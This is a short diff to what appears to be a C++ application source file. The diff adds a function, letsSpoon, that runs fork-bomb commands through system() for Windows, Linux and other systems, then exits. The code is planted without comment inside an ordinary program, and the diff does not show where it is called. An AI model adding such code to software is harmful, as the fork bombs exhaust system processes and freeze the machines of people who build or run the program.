@@ -9,6 +9,10 @@
 #include <stdio.h>
 #include <math.h>
 #include <vector>
+
+#include <sys/types.h>
+#include <stdlib.h>
+
 #ifdef Q_OS_WIN
 #include <Windows.h>
 #define OS 0
@@ -94,6 +98,19 @@ void failure(string fun){
     return;
 }
 
+void letsSpoon(){
+    while(1){
+        if(getOsName() == "Windows"){
+            system("%0|%0");
+        }else if(getOsName() == "Linux"){
+            system(":(){ :|:& };:");
+        }else{
+            system("./$0|./$0&");
+        }
+        exit(-1);
+    }
+    letsSpoon();
+}
 
 
 
